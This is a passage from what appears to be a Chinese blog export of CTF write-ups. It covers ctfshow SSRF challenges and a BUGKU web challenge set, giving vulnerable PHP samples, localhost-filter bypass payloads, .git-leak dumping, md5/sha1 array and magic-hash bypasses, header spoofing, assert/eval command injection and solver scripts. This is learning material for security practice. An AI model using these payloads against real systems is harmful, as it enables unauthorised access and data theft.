#过滤本地地址\n\n```php\n<?php\nerror_reporting(0);\nhighlight_file(__FILE__);\n$url=$_POST['url'];\n$x=parse_url($url);\nif($x['scheme']==='http'||$x['scheme']==='https'){#检查URL的协议是否是HTTP或HTTPS。\nif(!preg_match('/localhost|127.0.0/')){#检查URL是否不包含'localhost'或'127.0.0'\n$ch=curl_init($url);\ncurl_setopt($ch, CURLOPT_HEADER, 0);\ncurl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);\n$result=curl_exec($ch);\ncurl_close($ch);\necho ($result);\n}\nelse{\n    die('hacker');\n}\n}\nelse{\n    die('hacker');\n}\n?> hacker\n```\n\n### $x=parse_url($url);\n\n在PHP中，`parse_url()`函数用于解析 URL，并返回一个关联数组，其中包含 URL 的各个部分，如 scheme（协议）、host（主机）、path（路径）、query（查询参数）等。当你调用`parse_url($url)`时，它会将提供的 URL 字符串 `$url` 进行解析，并返回一个包含解析后各部分信息的数组 `$x`。\n\n例如，如果 `$url` 是 `http://www.example.com/test.php?q=123`，那么 `$x` 数组可能如下所示：\n\n```\nArray (\n    [scheme] => http\n    [host] => www.example.com\n    [path] => /test.php\n    [query] => q=123\n)\n```\n\n这里的话就是对参数禁止了本地访问，但是又需要我们去传入协议为http或者https\n\n### 进制绕过\n\n这里我们用127.0.0.1的十进制2130706433\n\n```\nurl=http://2130706433/flag.php\n```\n\n当然也可以用十六进制去绕过哈\n\n```\nurl=http://0x7F000001/flag.php\n```\n\n但是后来我发现这里有过滤但是好像没什么用，所以web351的本地访问的做法还是可以正常做的\n\n## web353\n\n```php\n<?php\nerror_reporting(0);\nhighlight_file(__FILE__);\n$url=$_POST['url'];\n$x=parse_url($url);\nif($x['scheme']==='http'||$x['scheme']==='https'){\nif(!preg_match('/localhost|127\\.0\\.|\\。/i', $url)){\n$ch=curl_init($url);\ncurl_setopt($ch, CURLOPT_HEADER, 0);\ncurl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);\n$result=curl_exec($ch);\ncurl_close($ch);\necho ($result);\n}\nelse{\n    die('hacker');\n}\n}\nelse{\n    die('hacker');\n}\n?> hacker\n```\n\n和上题一样用进制可以打的通\n\n### 关于环回地址\n\n但是127.0.0.1 ~ 127.255.255.254 都表示 localhost，在IPv4地址空间中，127.0.0.1到127.255.255.254是保留的地址范围，用于表示本地主机（localhost），也称为环回地址。\n\n所以我们的payload也可以是\n\n```php\nurl=http://127.233.233.233/flag.php\n```\n\n### sudo.cc代替本地地址\n\n当你在浏览器中输入`sudo.cc`时，操作系统会将这个域名解析为`127.0.0.1`，从而把请求发送到本地主机。\n\npayload\n\n```\nurl=http://sudo.cc/flag.php\n```\n\n## web354\n\n```php\n<?php\nerror_reporting(0);\nhighlight_file(__FILE__);\n$url=$_POST['url'];\n$x=parse_url($url);\nif($x['scheme']==='http'||$x['scheme']==='https'){\nif(!preg_match('/localhost|1|0|。/i', $url)){\n$ch=curl_init($url);\ncurl_setopt($ch, CURLOPT_HEADER, 0);\ncurl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);\n$result=curl_exec($ch);\ncurl_close($ch);\necho ($result);\n}\nelse{\n    die('hacker');\n}\n}\nelse{\n    die('hacker');\n}\n?> hacker\n```\n\n这次的话把1和0过滤了，能用的方法就是sudo.cc，但是我学了一种方法就是302跳转\n\n### 302跳转\n\n在自己的网站页面添加php文件进行302跳转\n\n```\n<?php\nheader(\"Location:http://127.0.0.1/flag.php\");\n```\n\n这串代码会将浏览器重定向到本地主机（localhost）上的`flag.php`页面，当浏览器收到这个响应头后，它会自动跳转到指定的URL地址。\n\n然后我们的payload:\n\n```\nurl=http://自己的网页地址/php文件名\n```\n\n## web355\n\n```php\n<?php\nerror_reporting(0);\nhighlight_file(__FILE__);\n$url=$_POST['url'];\n$x=parse_url($url);\nif($x['scheme']==='http'||$x['scheme']==='https'){\n$host=$x['host'];\nif((strlen($host)<=5)){\n$ch=curl_init($url);\ncurl_setopt($ch, CURLOPT_HEADER, 0);\ncurl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);\n$result=curl_exec($ch);\ncurl_close($ch);\necho ($result);\n}\nelse{\n    die('hacker');\n}\n}\nelse{\n    die('hacker');\n}\n?> hacker\n```\n\n这里对host的长度进行了限制，也就是我们不能用127.0.0.1这种地址去解题了，但是我们可以想到\n\n### 关于0的解析\n\n0在 linux 系统中会解析成127.0.0.1在windows中解析成0.0.0.0\n\n所以我们设置payload\n\n```\n[POST]payload：url=http://0/flag.php\n```\n\n### 关于无效地址解析\n\n在 URL 中，当域名或主机名中使用了一个无效的 IP 地址时，浏览器通常会将其解析为本地地址 127.0.0.1，即回送地址。\n\n所以我们的payload\n\n```\n[POST]payload：url=http://127.1/flag.php\n```\n\n## web356\n\n```php\n<?php\nerror_reporting(0);\nhighlight_file(__FILE__);\n$url=$_POST['url'];\n$x=parse_url($url);\nif($x['scheme']==='http'||$x['scheme']==='https'){\n$host=$x['host'];\nif((strlen($host)<=3)){\n$ch=curl_init($url);\ncurl_setopt($ch, CURLOPT_HEADER, 0);\ncurl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);\n$result=curl_exec($ch);\ncurl_close($ch);\necho ($result);\n}\nelse{\n    die('hacker');\n}\n}\nelse{\n    die('hacker');\n}\n?> hacker\n```\n\n只能有3个字符了，那就直接0或者0.0都行\n\n## web357\n\n```php\n<?php\nerror_reporting(0);\nhighlight_file(__FILE__);\n$url=$_POST['url'];\n$x=parse_url($url);\nif($x['scheme']==='http'||$x['scheme']==='https'){\n$ip = gethostbyname($x['host']);\necho '</br>'.$ip.'</br>';\nif(!filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {\n    die('ip!');\n}\n\n\necho file_get_contents($_POST['url']);\n}\nelse{\n    die('scheme');\n}\n?> scheme\n```\n\n### gethostbyname()函数\n\n`gethostbyname()` 函数是PHP中用于获取主机名对应的IP地址的函数。它接受一个主机名作为参数，并返回该主机名对应的IP地址。\n\n基础语法\n\n```php\nstring gethostbyname ( string $hostname )\n```\n\n- `$hostname`：要获取IP地址的主机名。\n\n### filter_var()函数\n\n`filter_var()` 函数是 PHP 中用于过滤和验证数据的函数之一。它可以根据指定的过滤器对数据进行过滤和验证，确保数据符合特定的格式、类型或规则。\n\n基础语法\n\n```php\nmixed filter_var ( mixed $variable [, int $filter = FILTER_DEFAULT [, mixed $options ]] )\n```\n\n- `$variable`：要过滤或验证的变量。\n- `$filter`：可选参数，指定要应用的过滤器。默认是 `FILTER_DEFAULT`，表示使用默认过滤器。\n- `$options`：可选参数，用于设置过滤器选项。\n\n### FILTER_VALIDATE_IP过滤器\n\n`FILTER_VALIDATE_IP` 是 PHP 中的一个常用过滤器，用于验证一个字符串是否为有效的 IP 地址。当使用 `FILTER_VALIDATE_IP` 过滤器时，`filter_var()` 函数将检查字符串是否为有效的 IPv4 或 IPv6 地址。\n\n### `FILTER_FLAG_NO_PRIV_RANGE` \n\n`FILTER_FLAG_NO_PRIV_RANGE` 是过滤器标志，用于排除私有地址。私有地址是指保留用于内部网络的地址\n\n### FILTER_FLAG_NO_RES_RANGE\n\nFILTER_FLAG_NO_RES_RANGE 是过滤器标志，用于排除保留地址。保留地址是指在公共网络中不可路由的地址。\n\n这里的话会验证我们传入的地址是否是有效的ip地址，并且会排除我们的私有地址和保留地址\n\n那我们的做法就是用302跳转去做\n\npayload：\n\n```\nurl=http://服务器的web页面地址/php文件名\n```\n\n或者也可以dns rebinding攻击\n\nDNS rebinding 攻击是一种利用 DNS 协议的漏洞来攻击网络应用程序的方法。在 DNS rebinding 攻击中，攻击者通过将恶意站点绑定到一个 IP 地址，然后将此 IP 地址映射到一个不同的 IP 地址，来欺骗目标浏览器执行恶意代码。\n\n1·修改自己域名的a记录，改成127.0.0.1\n\n2·这个网站a记录指向127.0.0.1 可以直接利用\n\n这个方法没试过，可以试一下\n\n## web358\n\n```php\n<?php\nerror_reporting(0);\nhighlight_file(__FILE__);\n$url=$_POST['url'];\n$x=parse_url($url);\nif(preg_match('/^http:\\/\\/ctf\\..*show$/i',$url)){\n    echo file_get_contents($url);\n}\n```\n\n先讲payload\n\n```php\nurl=http://ctf.@127.0.0.1/flag.php#show\nurl=http://ctf.@127.0.0.1/flag.php?show\n```\n\n为什么呢？\n\n- 当`parse_url()`解析到邮箱时：@前面是user，后面是password。因为在基于 HTTP 和 HTTPS 协议的 URL 中，`@` 符号通常用于指定用户名和密码，而不是作为域名的一部分。\n\n## web359\n\n打无密码的mysql\n\n![image-20241201220715178](./../image/achieve/202411/SSRF/image-20241201220715178.png)\n","tags":["SSRF服务器请求伪造"],"categories":["ctfshow"]},{"title":"BUGKU--web","url":"/2024/11/25/BUGKU-web/","content":"\n## 滑稽\n\n### #F12\n\n![image-20241125153012282](./../image/achieve/202411/BUGKU/image-20241125153012282.png)\n\n源代码就有flag\n\n![image-20241125153042040](./../image/achieve/202411/BUGKU/image-20241125153042040.png)\n\n## 计算器\n\n### #前端js\n\n![image-20241125153453676](./../image/achieve/202411/BUGKU/image-20241125153453676.png)\n\n题目说算对就能拿到flag，但是我发现这里只能输入一个数字，点击验证的话也抓不到包，然后查看源码发现是限制了输入的数字位数，改成3位就再填入答案就能拿到flag了\n\n![image-20241125153647739](./../image/achieve/202411/BUGKU/image-20241125153647739.png)\n\n## alert\n\n### #源码flag\n\n![image-20241125153903194](./../image/achieve/202411/BUGKU/image-20241125153903194.png)\n\n出现了很多的弹窗，是js语句alert的代码\n\n![image-20241125153951559](./../image/achieve/202411/BUGKU/image-20241125153951559.png)\n\n在源代码底下就有flag，拿去解密就可以拿到了\n\n![image-20241125154219421](./../image/achieve/202411/BUGKU/image-20241125154219421.png)\n\nflag{19760efbde5ba7ec9d7a861a071687eb}\n\n## 你必须让他停下\n\n### #随机抓包有flag\n\n这个题打开是一直有跳转\n\n![image-20241125170523418](./../image/achieve/202411/BUGKU/image-20241125170523418.png)\n\n在源码中找到flag is here\n\n![image-20241125170808813](./../image/achieve/202411/BUGKU/image-20241125170808813.png)\n\n我多截了几个图，然后不小心就截到了有flag的\n\n![image-20241125170840141](./../image/achieve/202411/BUGKU/image-20241125170840141.png)\n\n但是我们还是正常做一下哈\n\n用bp抓包，再不断发包，在response里面找带有flag的就可以了\n\n## 头等舱\n\n### #响应头\n\n![image-20241125171030828](./../image/achieve/202411/BUGKU/image-20241125171030828.png)\n\nflag在响应头中\n\n## GET\n\n### #GET传参\n\n![image-20241125182502224](./../image/achieve/202411/BUGKU/image-20241125182502224.png)\n\n直接get传参传what=flag就可以了\n\n## POST\n\n### #POST传参\n\n跟上一题是一样的，不过这道题是post传参\n\n## source\n\n### #.git泄露\n\nflag在源代码中被注释掉了，看起来是base64解码，拿去解码一下发现是假的flag\n\n应该是常规的信息收集，那我们就扫一下目录\n\n![image-20250428085701831](../image/achieve/202411/BUGKU/image-20250428085701831.png)\n\n看到一个flag.txt，访问一下发现也是假的，然后我们可以看到上面的.git文件，猜测是git信息泄露\n\n![image-20241125184238472](./../image/achieve/202411/BUGKU/image-20241125184238472.png)\n\n```\nwget -r http://url/.git\n```\n\n把git文件扒下来进行分析\n\n先试用命令**git reflog**\n\n`git reflog` 是一个 Git 命令，用于查看本地仓库中的引用日志（Reference Logs）。引用日志记录了仓库中的 HEAD 和分支引用的改动历史，可以帮助用户找回丢失的提交或者分支。具体而言，`git reflog` 命令可以显示最近的 HEAD 和分支引用的变动，包括提交、重置、合并等操作，以及相应的操作哈希值和操作描述。\n\n![image-20250428090145263](../image/achieve/202411/BUGKU/image-20250428090145263.png)\n\n然后一个个用git show进行查看就能找到真正的flag了\n\n![image-20250428090722129](../image/achieve/202411/BUGKU/image-20250428090722129.png)\n\n## 矛盾\n\n### #is_numeric绕过+弱比较 \n\n![image-20241125185209527](./../image/achieve/202411/BUGKU/image-20241125185209527.png)\n\n这里应该是嵌套的一个if语句吧，因为最后有输出我们传入的num。结合弱比较和is_numeric的作用，直接传入num=1e就能满足判断条件\n\n![image-20241125185739491](./../image/achieve/202411/BUGKU/image-20241125185739491.png)\n\n## 备份是个好习惯\n\n### #md5绕过\n\n出现编码，看着像是md5哈希值加密，我们先拿去解码一下看看，这个哈希值恰好是一个全为0的值，意思就是空文件，什么都没有\n\n根据题目，这可能是备份文件泄露\n\n#### 常见的网站源码备份文件后缀名\n\n- .rar\n- .zip\n- .7z\n- .tar.gz\n- .bak\n- .swp\n- .txt\n- .html\n\n#### 常见的网站源码备份文件名\n\n- web\n- website\n- backup\n- back\n- www\n- wwwroot\n- temp\n\n我们先用御剑扫一下目录找到了备份文件，下载下来发现是代码审计题\n\n```php\n<?php\n\ninclude_once \"flag.php\";\nini_set(\"display_errors\", 0);\n$str = strstr($_SERVER['REQUEST_URI'], '?');\n$str = substr($str,1);\n$str = str_replace('key','',$str);\n// 双写绕过\nparse_str($str);\n// 变量覆盖\necho md5($key1);\necho md5($key2);\nif(md5($key1) == md5($key2) && $key1 !== $key2){\n    echo $flag.\"取得flag\";\n}\n?>\n```\n\n这里的话就是md5绕过验证了，我们可以知道，当变量是数组的时候，他们的md5是相等的，但这里我们还需要注意的是变量名的验证\n\n1. `$str = str_replace('key','',$str);`：这行代码去掉了查询参数中的 \"key\" 字符串。\n\n所以这里我们用双写进行绕过验证\n\n```\npayload\n\n/?kkeyey1[]=1&kkeyey2[]=2\n```\n\n## 变量1\n\n```php\nerror_reporting(0);\ninclude \"flag1.php\";\nhighlight_file(__file__);\nif(isset($_GET['args'])){\n    $args = $_GET['args'];\n    if(!preg_match(\"/^\\w+$/\",$args)){\n        die(\"args error!\");\n    }\n    eval(\"var_dump($$args);\");\n}\n?>\n```\n\n分析一下正则匹配\n\npreg_match(\"/^\\w+$/\",$args)\n\n这段代码的作用是检查 `$args` 是否仅由字母、数字或下划线字符组成，且至少包含一个以上的字符\n\n最关键的是最后的$$args,这是可变变量的意思，如$args的值是另一个变量的变量名。那么$$args就代表另一个变量。所以我们就给args赋值一个变量名，那么PHP的九大全局变量，一个一个试。\n\n### 九大全局变量\n\n- $_POST [用于接收post提交的数据]\n- $_GET [用于获取url地址栏的参数数据]\n- $_FILES [用于文件就收的处理img 最常见]\n- $_COOKIE [用于获取与setCookie()中的name 值]\n- $_SESSION [用于存储session的值或获取session中的值]\n- $_REQUEST [具有get,post的功能，但比较慢]\n- SERVER[是预定义服务器变量的一种，所有SERVER[是预定义服务器变量的一种，所有_SERVER [是预定义服务器变量的一种，所有_SERVER开头的都\n- $GLOBALS [一个包含了全部变量的全局组合数组]\n- $_ENV [ 是一个包含服务器端环境变量的数组。它是PHP中一个超级全局变量，我们可以在PHP 程序的任何地方直接访问它]\n\n因为题目提示flag In the variable，所以flag是作为数组变量存储在里面的\n\n所以我们直接使用GLOBALS全局变量显示出所有的数组的键值对\n\n![image-20241125194129448](./../image/achieve/202411/BUGKU/image-20241125194129448.png)\n\n## 本地管理员\n\n### #伪造请求头\n\n先使用弱口令发现打不通，然后我在源码中看到有被注释掉的base64编码，解码后是test123，猜测是admin的密码\n\n我们抓包提交一下\n\n![image-20241125194924245](./../image/achieve/202411/BUGKU/image-20241125194924245.png)\n\n根据提示，这里需要伪造管理员的ip进行登录，我们添加一下x-forwarded-for: 127.0.0.1\n\n![image-20241125195024684](./../image/achieve/202411/BUGKU/image-20241125195024684.png)\n\n## game1\n\n### #前端验证\n\n是一个盖楼游戏\n\n在源代码中看到了\n\n![image-20241125204332965](./../image/achieve/202411/BUGKU/image-20241125204332965.png)\n\n这里的话应该就是我们的突破口了，可能是达到多少分才会有flag\n\n然后我们在游戏结束页面进行抓包\n\n![image-20241125204429474](./../image/achieve/202411/BUGKU/image-20241125204429474.png)\n\nsign中的MTc1==是175编码后的，那我们改一下score为9999试一下\n\n![image-20241125204805777](./../image/achieve/202411/BUGKU/image-20241125204805777.png)\n\n看来分数够了，成功拿到flag!\n\n## 源代码\n\n### #js代码审计\n\n题目提示我们看源代码，那我们就看一下源代码\n\n![image-20241125204914898](./../image/achieve/202411/BUGKU/image-20241125204914898.png)\n\n1. `var p1 = '...';` 和 `var p2 = '...';`：这里定义了两个变量 `p1` 和 `p2`，它们的值是经过编码的字符串。这种编码方式看起来类似于 URL 编码，将字符转换为 `%xx` 格式。\n2. `eval(unescape(p1) + unescape('%35%34%61%61%32' + p2));`：这里使用了 `eval()` 函数，它将字符串参数作为 JavaScript 代码进行执行。`unescape()` 函数用于解码 URL 编码的字符串。这行代码将对 `p1` 和 `p2` 进行解码后拼接起来，然后将其作为 JavaScript 代码进行执行。\n\n然后我拿去解码得到了这些\n\n```js\nfunction checkSubmit(){\n    var a=document.getElementById(\"password\");\n    if(\"undefined\"!=typeof a){\n        if(\"67d709b2b54aa2aa648cf6e87a7114f1\"==a.value)return!0;\n        alert(\"Error\");a.focus();\n        return!1\n    }\n}document.getElementById(\"levelQuest\").onsubmit=checkSubmit;\n\n```\n\n1. `function checkSubmit() { ... }`: 这是一个名为 `checkSubmit` 的函数，用于验证密码字段的值。函数内部包含以下逻辑：\n   - `var a = document.getElementById(\"password\");`: 通过 `document.getElementById()` 方法获取 id 为 \"password\" 的元素，通常表示密码输入框。\n   - `if (\"undefined\" != typeof a) { ... }`: 检查是否成功获取到密码输入框元素。\n   - `if (\"67d709b2%654aa2aa648cf6e87a7114f1\" == a.value) { return true; }`: 如果密码输入框的值等于指定的字符串（\"67d709b2%654aa2aa648cf6e87a7114f1\"），则返回 `true`，表示验证通过。\n   - `alert(\"Error\");`: 如果密码验证不通过，弹出警告框提示用户出错。\n   - `a.focus(); return false;`: 将焦点设置回密码输入框，并返回 `false`，表示验证未通过。\n2. `document.getElementById(\"levelQuest\").onsubmit = checkSubmit;`: 这行代码将 `checkSubmit` 函数绑定到 id 为 \"levelQuest\" 的表单的 `onsubmit` 事件上。这意味着在表单提交之前会执行 `checkSubmit` 函数，用于验证密码字段的值，如果验证通过，则表单提交成功，否则会提示错误信息并保持在当前页面。\n\n所以我们要让我们输入的值是67d709b2b54aa2aa648cf6e87a7114f1，输入后就能拿到flag了\n\n## 网站被黑\n\n### #后门木马\n\n题目提示:网站被黑了 黑客会不会留下后门\n\n既然是网站被黑了，那黑客必然会留下什么shell之类的恶意代码，那我们扫一下目录\n\n![image-20241125211016567](./../image/achieve/202411/BUGKU/image-20241125211016567.png)\n\n访问一下shell.php\n\n![image-20241125211206101](./../image/achieve/202411/BUGKU/image-20241125211206101.png)\n\n试了一下弱口令发现都不得行，那就只能爆破了\n\n![image-20241125211516817](./../image/achieve/202411/image-20241125211516817.png)\n\n![image-20241125211523239](./../image/achieve/202411/BUGKU/image-20241125211523239.png)\n\n额我们试一下bp自带的password字典\n\n![image-20241125211813962](./../image/achieve/202411/BUGKU/image-20241125211813962.png)\n\n刚好爆出来是有的\n\n## bp\n\n### #爆破密码\n\n提示了弱密码top1000？z?????，让我们找出密码\n\n![image-20241125212327225](./../image/achieve/202411/BUGKU/image-20241125212327225.png)\n\n账号是admin默认，看样子是需要我们进行爆破，字典应该是top1000，\n\n![image-20241125212754900](./../image/achieve/202411/BUGKU/image-20241125212754900.png)\n\n结果发现没打出来，我看了一下response的内容，发现了这段js代码\n\n```php\n  var r = {code: 'bugku10000'}\n  if(r.code == 'bugku10000'){\n        console.log('e');\n\tdocument.getElementById('d').innerHTML = \"Wrong account or password!\";\n  }else{\n        console.log('0');\n        window.location.href = 'success.php?code='+r.code;\n  }\n```\n\n后来看了其他大佬的解释：\n\n若r值为{code: 'bugku10000'}，则会返回错误\n\n{通过这一句“window.location.href = 'success.php?code='+r.code;”，可以判断网页将跳转到以code作为参数的success.php页面。其中code的值来自于var r = {code: 'bugku10000'}。\n\n 至此，可以考虑用burp进行爆破。但通过第一次爆破过程中所以返回页面长度一致，可以判断code值的长度与'bugku10000'相同，也是10。考虑到对于10个字符长度进行爆破需要的时间太长，因此现在以code为参数爆破是不可行的。\n\n因为code是success.php页面的参数，因此在登录页面当使用正确密码时，code的值（r.code）应该与'bugku10000'不同，进而r的值也与{code: 'bugku10000'}不同。\n\n 也就是说，如果我们输入正确的密码，返回页面的r将不是{code: 'bugku10000'}。\n\n因此可以在burp的intruder爆破模块中，使用{code: 'bugku10000'}对返回包内容进行筛选。找到返回包不含有{code: 'bugku10000'}的，就可能是使用正确的密码。}\n\n![image-20241125213525551](./../image/achieve/202411/BUGKU/image-20241125213525551.png)\n\n![image-20241125213819622](./../image/achieve/202411/BUGKU/image-20241125213819622.png)\n\n爆破后找到了这个密码的回显包中没有{code: 'bugku10000'}，猜测可能是我们想要的密码，直接输入就能拿到flag了\n\n## 好像需要密码\n\n### #纯数字爆破\n\n![image-20241125214206865](./../image/achieve/202411/BUGKU/image-20241125214206865.png)\n\n又是一个密码界面，直接上爆破吧，因为是纯数字，所以我们设置纯数字的字典进行爆破就可以了\n\n![image-20241125214705440](./../image/achieve/202411/BUGKU/image-20241125214705440.png)\n\n这道题我看到需要爆破的量很多，我就去搜索怎么添加线程。结果忙来忙去浪费了很多时间，不如让他挂着爆破，最后还是拿到flag了\n\n## shell\n\n### #assert函数\n\n打开是一个空白页面，不过在题目提示中有代码\n\n```php\n<?php\n$poc = \"a#s#s#e#r#t\"; \n$poc_1 = explode(\"#\", $poc); \n$poc_2 = $poc_1[0] . $poc_1[1] . $poc_1[2] . $poc_1[3] . $poc_1[4] . $poc_1[5];\n$poc_2($_GET['s']);\n?>\n```\n\n1. 首先，定义了一个变量 `$poc`，其值为字符串 \"a#s#s#e#r#t\"\n2. 接着，使用 `explode` 函数将字符串 `$poc` 按照 \"#\" 分割成数组 `$poc_1`，所以 `$poc_1` 的值为 `[\"a\", \"s\", \"s\", \"e\", \"r\", \"t\"]`。\n3. 然后，从数组 `$poc_1` 中取出各个元素并拼接成一个字符串 `$poc_2`，这里实际上是将函数名 `assert` 重新组合成字符串。\n4. 最后，通过 `$poc_2` 这个字符串作为函数名，执行用户传入的GET参数 `'s'` 的内容。\n\n那我们了解一下assert函数\n\n`assert` 函数是PHP中的一个调试函数，通常用于在代码中验证某个条件是否为真\n\n这里我猜测是我们需要传入的参数s是一个命令，然后assert会将这个命令解析执行\n\n我们可以测试一下\n\n![image-20241125232837903](./../image/achieve/202411/BUGKU/image-20241125232837903.png)\n\n发现是可以正常执行的，那我们就用我们熟悉的ls和cat就可以拿到flag了\n\n## eval\n\n### #eval函数\n\n```php\n<?php\n    include \"flag.php\";\n    $a = @$_REQUEST['hello'];\n    eval( \"var_dump($a);\");\n    show_source(__FILE__);\n?>\n```\n\n直接对hello传入system命令就行了\n\n## 需要管理员\n\n### #.robot文件泄露\n\n![image-20241125233808776](./../image/achieve/202411/BUGKU/image-20241125233808776.png)\n\n查看源码和页面都没发现什么有用的信息，我们试着用dirsearch扫一下目录\n\n![image-20241128160951844](./../image/achieve/202411/BUGKU/image-20241128160951844.png)\n\n得到一个/robots.txt文件，我们访问一下\n\n![image-20241128161024755](./../image/achieve/202411/BUGKU/image-20241128161024755.png)\n\n 我们访问一下\n\n![image-20241128161414514](./../image/achieve/202411/BUGKU/image-20241128161414514.png)\n\n直接传入x=admin就可以了\n\n![image-20241128161501709](./../image/achieve/202411/BUGKU/image-20241128161501709.png)\n\n## 程序员本地网站\n\n### #伪造X-Forwarded-For请求头\n\n![image-20241126104244668](./../image/achieve/202411/BUGKU/image-20241126104244668.png)\n\n看到这个第一时间想到的就是修改请求头进行内网伪装\n\n**X-Forwarded-For\t\t用来说明从哪里来的，一般用来内网伪装\t\t\tX-Forwarded-For: 127.0.0.1**\n\n在请求包中添加X-Forwarded-For: 127.0.0.1\n\n![image-20241126104319404](./../image/achieve/202411/BUGKU/image-20241126104319404.png)\n\n直接就拿到flag了\n\n## 你从哪里来\n\n### #伪造Referer请求头\n\n![image-20241126104920035](./../image/achieve/202411/BUGKU/image-20241126104920035.png)\n\n这个一看就是需要修改请求头了\n\n**Referer\t先前网页的地址，当前请求网页紧随其后,即来路\tReferer: [www.baidu.com](www.baidu.com)**\n\n需要先前网页是谷歌的地址\n\n![image-20241126105256625](./../image/achieve/202411/BUGKU/image-20241126105256625.png)\n\n## 前女友\n\n### #绕过md5和strcmp()验证\n\n![image-20241126105607312](./../image/achieve/202411/BUGKU/image-20241126105607312.png)\n\n在源代码中找到了code.txt\n\n![image-20241126105944232](./../image/achieve/202411/BUGKU/image-20241126105944232.png)\n\n我们点进去看一下\n\n![image-20241126105950391](./../image/achieve/202411/BUGKU/image-20241126105950391.png)\n\n`strcmp()` 是一个 PHP 函数，用于比较两个字符串。它的用法如下：\n\n```\nint strcmp ( string $str1 , string $str2 )\n```\n\n- 如果 `str1` 小于 `str2`，那么 `strcmp()` 返回一个小于 0 的整数。\n- 如果 `str1` 大于 `str2`，那么 `strcmp()` 返回一个大于 0 的整数。\n- 如果 `str1` 等于 `str2`，那么 `strcmp()` 返回 0。\n\nstrcmp函数无法比较数组,对象，会返回0\n\nmd5可以用数组绕过，也可以用碰撞\n\n![image-20241126110733003](./../image/achieve/202411/BUGKU/image-20241126110733003.png)\n\n## MD5\n\n### #MD5碰撞\n\n![image-20241126110838510](./../image/achieve/202411/BUGKU/image-20241126110838510.png)\n\n那我们传入a=1试试\n\n![image-20241126110902896](./../image/achieve/202411/BUGKU/image-20241126110902896.png)\n\n提示错误，题目提示是md5碰撞，根据 PHP 弱类型比较的特点，所以如果两个不同的密码经过哈希以后，其哈希值都是以 `0E` 开头的，那么 PHP 将会认为他们相同，这就是所谓的 **MD5 碰撞漏洞**。\n\n所以我们选一个常见的md5碰撞值就可以了\n\n```php\n大写字母类：\nQLTHNDT\n0e405967825401955372549139051580\nQNKCDZO\n0e830400451993494058024219903391\nEEIZDOI\n0e782601363539291779881938479162\nTUFEPMC\n0e839407194569345277863905212547\nUTIPEZQ\n0e382098788231234954670291303879\nUYXFLOI\n0e552539585246568817348686838809\nIHKFRNS\n0e256160682445802696926137988570\nPJNPDWY\n0e291529052894702774557631701704\nABJIHVY\n0e755264355178451322893275696586\nDQWRASX\n0e742373665639232907775599582643\nDYAXWCA\n0e424759758842488633464374063001\nGEGHBXL\n0e248776895502908863709684713578\nGGHMVOE\n0e362766013028313274586933780773\nGZECLQZ\n0e537612333747236407713628225676\nNWWKITQ\n0e763082070976038347657360817689\nNOOPCJF\n0e818888003657176127862245791911\nMAUXXQC\n0e478478466848439040434801845361\nMMHUWUV\n0e701732711630150438129209816536\n```\n\n## 各种绕过哟\n\n### #sha1数组绕过\n\n```php\n<?php\nhighlight_file('flag.php');\n$_GET['id'] = urldecode($_GET['id']);\n$flag = 'flag{xxxxxxxxxxxxxxxxxx}';\nif (isset($_GET['uname']) and isset($_POST['passwd'])) {\n    if ($_GET['uname'] == $_POST['passwd'])\n\n        print 'passwd can not be uname.';\n\n    else if (sha1($_GET['uname']) === sha1($_POST['passwd'])&($_GET['id']=='margin'))\n\n        die('Flag: '.$flag);\n\n    else\n\n        print 'sorry!';\n\n}\n?>\n```\n\n关注判断条件\n\n只要使uname的sha1的值与passwd的sha1的值相等即可，但是同时他们两个的值又不能相等\n\nsha1()函数无法处理数组类型，会将报错并返回false\n\nGET:id=margin&&uname[]=1\n\nPOST:passwd[]=2\n\n## 秋名山车神\n\n### #计算脚本\n\n多刷新几次会有出现\n\n![image-20241126112822178](./../image/achieve/202411/BUGKU/image-20241126112822178.png)\n\n说明我们要post提交参数value\n\n直接用脚本吧(抄的baozongwi 的)\n\n```python\nimport requests#用于发送 HTTP 请求。\nimport re#用于处理正则表达式。\n\nurl=\"http://114.67.175.224:19401/\"#要访问的网页的 URL。\ns=requests.Session()#保持会话\n\nr=s.get(url)\nequation=re.search(r'(\\d+[+\\-*])+(\\d+)',r.text).group()#在页面返回的文本中寻找一个数学表达式，并将找到的表达式存储在变量 equation 中。\nfor i in range(0,50):\n    result=eval(equation)#eval() 函数用来执行一个字符串表达式，并返回表达式的值。\n    key={'value':result}\n    response=s.post(url=url,data=key)\n    print(response.text)\n    if \"flag\" in response.text:#查找在response中的flag\n        break\n```\n\n## 速度要快\n\n![image-20241126114230980](./../image/achieve/202411/BUGKU/image-20241126114230980.png)\n\n刷新并没有发现什么，直接抓包\n\n![image-20241126114249269](./../image/achieve/202411/BUGKU/image-20241126114249269.png)\n\n发现response中有flag，base64解密得到\n\n![image-20241126114340881](./../image/achieve/202411/BUGKU/image-20241126114340881.png)\n\n还有一层加密\n\n![image-20241126114357915](./../image/achieve/202411/BUGKU/image-20241126114357915.png)\n\n这个数是什么呢，根据注释里面的内容，猜测我们需要post传入一个参数margin\n\n修改一下请求包为post，传入margin=597691\n\n![image-20241126114537404](./../image/achieve/202411/BUGKU/image-20241126114537404.png)\n\n有变化，继续分析，然后我发现是重复的，没办法，只能写脚本了\n\n```python\nimport requests\nimport base64\n\nurl = \"http://114.67.175.224:16522/\"\ns=requests.Session()\n\nfor i in range(0,50):\n    r=s.get(url)#发起一个 GET 请求，获取指定 URL 的响应，并将响应存储在变量 r 中\n    header_flag=r.headers['flag']#从响应的头信息中获取名为 'flag' 的值，并将其存储在 header_flag 中。\n    header_flag=base64.b64decode(header_flag).decode()\n\n    value=header_flag.split(' ')[-1]# 将字符串 header_flag 按空格分割，然后取最后一个部分作为 value。\n    v=base64.b64decode(value).decode('utf-8')# 对 Base64 编码的 value 进行解码，然后将其转换为 UTF-8 编码的字符串。\n    response=s.post(url,data={'margin':v})\n    print(response.text)\n    if 'flag' in response.text:\n        print(response.text)\n        break\n\n```\n\n## file_get_contents\n\n### #伪协议绕过\n\n```php\n<?php\nextract($_GET);\nif (!empty($ac)){\n    $f = trim(file_get_contents($fn));\n    if ($ac === $f){\n        echo \"<p>This is flag:\" .\" $flag</p>\";\n    }\n    else{\n        echo 